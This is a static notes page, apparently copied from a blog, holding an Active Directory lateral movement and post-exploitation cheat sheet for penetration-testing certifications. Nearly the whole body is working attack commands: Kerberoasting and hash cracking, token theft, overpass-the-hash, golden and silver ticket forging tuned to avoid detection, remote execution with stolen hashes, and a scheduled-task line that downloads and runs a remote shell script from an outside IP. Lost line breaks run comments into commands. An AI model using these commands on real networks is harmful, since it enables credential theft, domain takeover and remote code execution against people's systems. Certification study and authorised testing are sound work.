
<!DOCTYPE html>

<html class="no-js" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<link href="../AD%20Rep%20Check/" rel="prev"/>
<link href="../Boot%20Rec%20Repair/" rel="next"/>
<link href="../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.4.2, mkdocs-material-9.0.6" name="generator"/>
<title>AD lateral movement &amp; Post exploitation - obsidian-mkdocs template</title>
<link href="../assets/stylesheets/main.558e4712.min.css" rel="stylesheet"/>
<link href="../assets/stylesheets/palette.2505c338.min.css" rel="stylesheet"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
<script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
</head>
<body data-md-color-accent="indigo" data-md-color-primary="pink" data-md-color-scheme="default" dir="ltr">
<script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#lateral-movement">
          Skip to content
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header" data-md-component="header">
<nav aria-label="Header" class="md-header__inner md-grid">
<a aria-label="obsidian-mkdocs template" class="md-header__button md-logo" data-md-component="logo" href=".." title="obsidian-mkdocs template">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            obsidian-mkdocs template
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              AD lateral movement &amp; Post exploitation
            
          </span>
</div>
</div>
</div>
<form class="md-header__option" data-md-component="palette">
<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="pink" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
</label>
<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="blue" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="pink" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"></path></svg>
</label>
</form>
<label class="md-header__button md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
</label>
<div class="md-search" data-md-component="search" role="dialog">
<label class="md-search__overlay" for="__search"></label>
<div class="md-search__inner" role="search">
<form class="md-search__form" name="search">
<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
<label class="md-search__icon md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg>
</label>
<nav aria-label="Search" class="md-search__options">
<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg>
</button>
</nav>
</form>
<div class="md-search__output">
<div class="md-search__scrollwrap" data-md-scrollfix="">
<div class="md-search-result" data-md-component="search-result">
<div class="md-search-result__meta">
            Initializing search
          </div>
<ol class="md-search-result__list" role="presentation"></ol>
</div>
</div>
</div>
</div>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Navigation" class="md-nav md-nav--primary" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="obsidian-mkdocs template" class="md-nav__button md-logo" data-md-component="logo" href=".." title="obsidian-mkdocs template">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
</a>
    obsidian-mkdocs template
  </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="..">
        Obsidian Notes
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../AD%20Rep%20Check/">
        AD Rep Check
      </a>
</li>
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" data-md-toggle="toc" id="__toc" type="checkbox"/>
<a class="md-nav__link md-nav__link--active" href="./">
        AD lateral movement &amp; Post exploitation
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Boot%20Rec%20Repair/">
        Boot Rec Repair
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../CLI%20Stuff/">
        CLI Stuff
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../FRS%20to%20DFSR%20Sysvol/">
        FRS to DFSR Sysvol
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Fix%20Take%20Controll/">
        Fix Take Controll
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Free%20RDP%20TLS%20Cert/">
        Free RDP TLS Cert
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Hash%20dumping/">
        Hash dumping
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Iperf%20Documentation/">
        Iperf Documentation
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Markdown/">
        Markdown Cheat Sheet
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Next%20Cloud%20Setup%20notes/">
        Next Cloud Setup notes
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Obsidian/">
        Obsidian
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Onsites/">
        Onsites
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Pivoting%20and%20tunneling/">
        Pivoting and Tunneling for OSCP and beyond (Cheat Sheet)
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Powershell%20Scripts/">
        Powershell Scripts
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Priv%20esc/">
        Priv esc
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../ToDo%20List/">
        ToDo List
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Xanmod/">
        Xanmod
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../nmap/">
        Nmap
      </a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
</nav>
</div>
</div>
</div>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<p>This is a detailed cheat sheet to help you with many high end certifications like CRTE, OSEP, and definitely OSCP and beyond.</p>
<blockquote>
<p>Table of Contents</p>
</blockquote>
<p><a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769"><strong>Lateral Movement</strong></a></p>
<p><a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b098">Lateral Movement Enumeration With PowerView</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#9c4b">BloodHound</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#8b8b">Kerberoasting</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#50fa">AS-REP roasting</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#fb63">Token Manipulation</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#e0c0">Lateral Movement with Rubeus</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#156a">Lateral Movement with Mimikatz</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#7a1f">Command execution with scheduled tasks</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#fedc">Command execution with WMI</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#0832">Command execution with PowerShell Remoting</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#41a4">Unconstrained delegation</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#301f">Constrained delegation</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#12cb">Resource-based constrained delegation</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#be43">Abusing domain trust</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#32bf">Abusing inter-forest trust</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#00a1">Abusing MSSQL databases for lateral movement</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#6eca">Abusing Group Policy Objects for lateral movement</a></p>
<p><a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1"><strong>Post-Exploitation</strong></a></p>
<p><a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#17f1">LSASS protection</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#08e9">Dumping OS credentials with Mimikatz</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#8cd1">Abusing the Data Protection API (DPAPI) with Mimikatz</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#2be4">Dumping secrets without Mimikatz</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#168a">Windows Defender evasion</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#3cb4">Chisel proxying</a><br/>
<a href="https://medium.com/@kuwaitison/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#3cb4">Interesting Files</a></p>
<h1 id="lateral-movement">Lateral Movement<a class="headerlink" href="#lateral-movement" title="Permanent link">¶</a></h1>
<h1 id="lateral-movement-enumeration-with-powerview">Lateral Movement Enumeration With PowerView<a class="headerlink" href="#lateral-movement-enumeration-with-powerview" title="Permanent link">¶</a></h1>
<h1 id="find-existing-local-admin-access-for-user-noisy">Find existing local admin access for user (noisy 🚩)<a class="headerlink" href="#find-existing-local-admin-access-for-user-noisy" title="Permanent link">¶</a></h1>
<p>Find-LocalAdminAccess# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)<br/>
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }# Look for kerberoastable users<br/>
Get-DomainUser -SPN | select name,serviceprincipalname# Look for AS-REP roastable users<br/>
Get-DomainUser -PreauthNotRequired | select name# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised  </p>
<h2 id="exploitation-depends-on-the-identified-acl-some-techniques-are-discussed-in-this-cheat-sheet">Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet<a class="headerlink" href="#exploitation-depends-on-the-identified-acl-some-techniques-are-discussed-in-this-cheat-sheet" title="Permanent link">¶</a></h2>
<h2 id="example-for-genericwrite-on-user-disable-preauth-or-add-spn-for-targeted-kerberoast-see-below">Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)<a class="headerlink" href="#example-for-genericwrite-on-user-disable-preauth-or-add-spn-for-targeted-kerberoast-see-below" title="Permanent link">¶</a></h2>
<p>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "UserOrGroupToQuery"}# Look for servers with Unconstrained Delegation enabled  </p>
<h2 id="if-available-and-you-have-admin-privs-on-this-server-get-user-tgt-see-below">If available and you have admin privs on this server, get user TGT (see below)<a class="headerlink" href="#if-available-and-you-have-admin-privs-on-this-server-get-user-tgt-see-below" title="Permanent link">¶</a></h2>
<p>Get-DomainComputer -Unconstrained# Look for users or computers with Constrained Delegation enabled  </p>
<h2 id="if-available-and-you-have-usercomputer-hash-access-service-machine-as-da-see-below">If available and you have user/computer hash, access service machine as DA (see below)<a class="headerlink" href="#if-available-and-you-have-usercomputer-hash-access-service-machine-as-da-see-below" title="Permanent link">¶</a></h2>
<p>Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto<br/>
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto</p>
<p>PowerShell</p>
<h1 id="bloodhound">BloodHound<a class="headerlink" href="#bloodhound" title="Permanent link">¶</a></h1>
<p>Use <code>Invoke-BloodHound</code> from <code>SharpHound.ps1</code>, or use <code>SharpHound.exe</code>. Both can be run reflectively, get them <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">here</a>. Examples below use the PowerShell variant but arguments are identical.</p>
<h1 id="run-all-checks-including-restricted-groups-enforced-through-the-domain">Run all checks, including restricted groups enforced through the domain  🚩<a class="headerlink" href="#run-all-checks-including-restricted-groups-enforced-through-the-domain" title="Permanent link">¶</a></h1>
<p>Invoke-BloodHound -CollectionMethod All,GPOLocalGroup# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy 🚩<br/>
Invoke-BloodHound -CollectionMethod LoggedOn</p>
<p>PowerShell</p>
<p>For real engagements definitely look into the <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html">various arguments</a> that BloodHound provides for more stealthy collection and exfiltration of data.</p>
<h1 id="kerberoasting">Kerberoasting<a class="headerlink" href="#kerberoasting" title="Permanent link">¶</a></h1>
<h2 id="automatic">Automatic<a class="headerlink" href="#automatic" title="Permanent link">¶</a></h2>
<p>With PowerView:</p>
<p>Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"</p>
<p>PowerShell</p>
<p>Crack the hash with Hashcat:</p>
<p>hashcat -a 0 -m 13100 hash.txt <code>pwd</code>/rockyou.txt --rules-file <code>pwd</code>/hashcat/rules/best64.rule</p>
<p>Bash</p>
<h2 id="manual">Manual<a class="headerlink" href="#manual" title="Permanent link">¶</a></h2>
<h1 id="request-tgs-for-kerberoastable-account-spn">Request TGS for kerberoastable account (SPN)<a class="headerlink" href="#request-tgs-for-kerberoastable-account-spn" title="Permanent link">¶</a></h1>
<p>Add-Type -AssemblyName System.IdentityModel<br/>
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"# Dump TGS to disk<br/>
Invoke-Mimikatz -Command '"kerberos::list /export"'# Crack with TGSRepCrack<br/>
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi</p>
<p>PowerShell</p>
<h2 id="targeted-kerberoasting-by-setting-spn">Targeted kerberoasting by setting SPN<a class="headerlink" href="#targeted-kerberoasting-by-setting-spn" title="Permanent link">¶</a></h2>
<p>We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:</p>
<p>Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}</p>
<p>PowerShell</p>
<h1 id="as-rep-roasting">AS-REP roasting<a class="headerlink" href="#as-rep-roasting" title="Permanent link">¶</a></h1>
<p>Get the hash for a roastable user (see above for hunting). Using <code>ASREPRoast.ps1</code>:</p>
<p>Get-ASREPHash -UserName TargetUser</p>
<p>PowerShell</p>
<p>Crack the hash with Hashcat:</p>
<p>hashcat -a 0 -m 18200 hash.txt <code>pwd</code>/rockyou.txt --rules-file <code>pwd</code>/hashcat/rules/best64.rule</p>
<p>Bash</p>
<h2 id="targeted-as-rep-roasting-by-disabling-kerberos-pre-authentication">Targeted AS-REP roasting by disabling Kerberos pre-authentication<a class="headerlink" href="#targeted-as-rep-roasting-by-disabling-kerberos-pre-authentication" title="Permanent link">¶</a></h2>
<p>Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:</p>
<p>Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}</p>
<p>PowerShell</p>
<h1 id="token-manipulation">Token Manipulation<a class="headerlink" href="#token-manipulation" title="Permanent link">¶</a></h1>
<p>Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the ‘Steal Token’ functionality in Cobalt Strike).</p>
<h2 id="incognito">Incognito<a class="headerlink" href="#incognito" title="Permanent link">¶</a></h2>
<h1 id="show-tokens-on-the-machine">Show tokens on the machine<a class="headerlink" href="#show-tokens-on-the-machine" title="Permanent link">¶</a></h1>
<p>.\incognito.exe list_tokens -u# Start new process with token of a specific user<br/>
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe</p>
<p>PowerShell</p>
<blockquote>
<p><em>If you’re using Meterpreter, you can use the built-in Incognito module with</em> <code>_use incognito_</code><em>, the same commands are available.</em></p>
</blockquote>
<h2 id="invoke-tokenmanipulation">Invoke-TokenManipulation<a class="headerlink" href="#invoke-tokenmanipulation" title="Permanent link">¶</a></h2>
<h1 id="show-all-tokens-on-the-machine">Show all tokens on the machine<a class="headerlink" href="#show-all-tokens-on-the-machine" title="Permanent link">¶</a></h1>
<p>Invoke-TokenManipulation -ShowAll# Show only unique, usable tokens on the machine<br/>
Invoke-TokenManipulation -Enumerate# Start new process with token of a specific user<br/>
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"# Start new process with token of another process<br/>
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500</p>
<p>PowerShell</p>
<h1 id="lateral-movement-with-rubeus">Lateral Movement with Rubeus<a class="headerlink" href="#lateral-movement-with-rubeus" title="Permanent link">¶</a></h1>
<p>We can use Rubeus to execute a technique called “Overpass-the-Hash”. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.</p>
<h1 id="request-a-tgt-as-the-target-user-and-pass-it-into-the-current-session">Request a TGT as the target user and pass it into the current session<a class="headerlink" href="#request-a-tgt-as-the-target-user-and-pass-it-into-the-current-session" title="Permanent link">¶</a></h1>
<h1 id="note-make-sure-to-clear-tickets-in-the-current-session-with-klist-purge-to-ensure-you-dont-have-multiple-active-tgts">NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs<a class="headerlink" href="#note-make-sure-to-clear-tickets-in-the-current-session-with-klist-purge-to-ensure-you-dont-have-multiple-active-tgts" title="Permanent link">¶</a></h1>
<p>.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)<br/>
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)<br/>
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe</p>
<p>PowerShell</p>
<p>Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.</p>
<h1 id="lateral-movement-with-mimikatz">Lateral Movement with Mimikatz<a class="headerlink" href="#lateral-movement-with-mimikatz" title="Permanent link">¶</a></h1>
<p>Note that Mimikatz is incredibly versatile and is discussed in multiple sections throughout this blog. Because of this, however, the binary is also very well-detected. If you need to run Mimikatz on your target (not recommended), executing a custom version reflectively is your best bet. There are also options such as <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-MimiKatz</a> or <a href="https://github.com/GhostPack/SafetyKatz">Safetykatz</a>. Note that the latter is more stealthy but does not include all functionality.</p>
<h1 id="overpass-the-hash-more-risky-than-rubeus-writes-to-lsass-memory">Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)<a class="headerlink" href="#overpass-the-hash-more-risky-than-rubeus-writes-to-lsass-memory" title="Permanent link">¶</a></h1>
<p>sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands<br/>
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe# Golden ticket (domain admin, w/ some ticket properties to avoid detection)<br/>
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt# Silver ticket for a specific SPN with a compromised service / machine account<br/>
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</p>
<p>Plaintext</p>
<blockquote>
<p><em>A nice overview of the SPNs relevant for offensive purposes is provided</em> <a href="https://adsecurity.org/?p=2011"><em>here</em></a> <em>(scroll down) and</em> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket-silver-tickets"><em>here</em></a><em>.</em></p>
</blockquote>
<h1 id="command-execution-with-scheduled-tasks">Command execution with scheduled tasks<a class="headerlink" href="#command-execution-with-scheduled-tasks" title="Permanent link">¶</a></h1>
<p><em>Requires ‘Host’ SPN</em></p>
<p>To create a task:</p>
<h1 id="mind-the-quotes-use-encoded-commands-if-quoting-becomes-too-much-of-a-pain">Mind the quotes. Use encoded commands if quoting becomes too much of a pain<a class="headerlink" href="#mind-the-quotes-use-encoded-commands-if-quoting-becomes-too-much-of-a-pain" title="Permanent link">¶</a></h1>
<p>schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.targetdomain.com /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"</p>
<p>PowerShell</p>
<p>To trigger the task:</p>
<p>schtasks /RUN /TN "shell" /s dc.targetdomain.com</p>
<p>PowerShell</p>
<h1 id="command-execution-with-wmi">Command execution with WMI<a class="headerlink" href="#command-execution-with-wmi" title="Permanent link">¶</a></h1>
<p><em>Requires ‘Host’ and ‘RPCSS’ SPNs</em></p>
<h2 id="from-windows">From Windows<a class="headerlink" href="#from-windows" title="Permanent link">¶</a></h2>
<p>Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"</p>
<p>PowerShell</p>
<h2 id="from-linux">From Linux<a class="headerlink" href="#from-linux" title="Permanent link">¶</a></h2>
<h1 id="with-password">with password<a class="headerlink" href="#with-password" title="Permanent link">¶</a></h1>
<p>impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101# with hash<br/>
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :e0e223d63905f5a7796fb1006e7dc594# with Kerberos authentication (make sure your client is setup to use the right ticket, and that you have a TGS with the right SPNs)<br/>
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k</p>
<p>Bash</p>
<h1 id="command-execution-with-powershell-remoting">Command execution with PowerShell Remoting<a class="headerlink" href="#command-execution-with-powershell-remoting" title="Permanent link">¶</a></h1>
<p><em>Requires ‘CIFS’ and ‘HTTP’ SPNs. May also need the ‘WSMAN’ or ‘RPCSS’ SPNs (depending on OS version)</em></p>
<h1 id="create-credential-to-run-as-another-user-not-needed-after-eg-overpass-the-hash">Create credential to run as another user (not needed after e.g. Overpass-the-Hash)<a class="headerlink" href="#create-credential-to-run-as-another-user-not-needed-after-eg-overpass-the-hash" title="Permanent link">¶</a></h1>
<h1 id="leave-out-credential-cred-in-the-below-commands-to-run-as-the-current-user-instead">Leave out -Credential $Cred in the below commands to run as the current user instead<a class="headerlink" href="#leave-out-credential-cred-in-the-below-commands-to-run-as-the-current-user-instead" title="Permanent link">¶</a></h1>
<p>$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force<br/>
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)# Run a command remotely (can be used on multiple machines at once)<br/>
Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}# Launch a session as another user (prompt for password instead, for use with e.g. RDP)<br/>
Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser# Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt<br/>
$sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com<br/>
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1<br/>
Enter-PsSession -Session $sess# Copy files to or from an active PowerShell remoting session<br/>
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination "C:\Users\public\"</p>
<p>PowerShell</p>
<h1 id="unconstrained-delegation">Unconstrained delegation<a class="headerlink" href="#unconstrained-delegation" title="Permanent link">¶</a></h1>
